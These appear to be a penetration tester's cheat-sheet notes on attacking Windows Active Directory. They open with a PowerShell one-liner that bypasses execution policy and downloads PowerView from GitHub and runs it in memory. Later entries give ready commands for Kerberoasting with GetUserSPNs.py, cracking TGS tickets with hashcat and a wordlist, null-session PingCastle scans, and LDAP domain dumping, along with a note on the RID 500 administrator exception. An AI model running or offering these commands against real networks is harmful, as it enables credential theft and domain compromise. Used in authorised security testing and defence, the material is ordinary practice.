
```bash
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Get-NetDomain"
```

## Detect Firewall Blocking AD

PortQryUI - http://www.microsoft.com/download/en/details.aspx?id=24009
* Run the “Domains & Trusts” option between DCs, or between DCs and any machine
* “NOTLISTENING,” 0x00000001, and 0x00000002, that means there is a port block
* Can ignore UDP 389 and UDP 88 messages
* TCP 42 errors, that just means WINS is not running on the target server

> https://blogs.msmvps.com/acefekay/2011/11/01/active-directory-firewall-ports-let-s-try-to-make-this-simple/

## Scanning

```
pingcastle.exe --healthcheck --server <DOMAIN_CONTROLLER_IP> --user <USERNAME> --password <PASSWORD> --advanced-live --nullsession
```

- Automating AD Enumeration (Bloodhound, PowerUp, Responder, CrackMapExec): https://medium.com/bugbountywriteup/automating-ad-enumeration-with-frameworks-f8c7449563be


## Collections

- [Active Directory Kill Chain Attack & Defense](https://github.com/infosecn1nja/AD-Attack-Defense)


## KB2871997
- https://technet.microsoft.com/library/security/2871997
- Microsoft has definitely raised the bar: accounts that are members of the localgroup “Administrators” are no longer able to execute code with WMI or PSEXEC, use schtasks or at, or even browse the open shares on the target machine. Oh, except (as pwnag3 reports and our experiences confirm) the RID 500 built-in Administrator account, even if it’s renamed.

## Microsoft Windows AD Kerberos Tickets

Gather tickets 
```
GetUserSPNs.py -request (HOST.DOMAIN)/(VALID SMB USER):(USER PASSWORD)
```

Crack
```
-a 0 - Straight cracking mode
-m 13100 - Hashtype 13100 - which is Kerberos 5 TGS-REP etype 23
the kerberos.ticket file
-w 3 - Suggested example "workload" setting for Hashcat

.\hashcat64.exe -m 13100 -a 0 'C:\Users\weaknet\Desktop\Portfolio\VMWare Shared\kerberos.tick
et' -w 3 'C:\Users\weaknet\Desktop\Portfolio\VMWare Shared\rockyou.txt'
hashcat (v5.1.0) starting...
```


## Dump 

```
ldapdomaindump -u example\example 10.10.10.10
```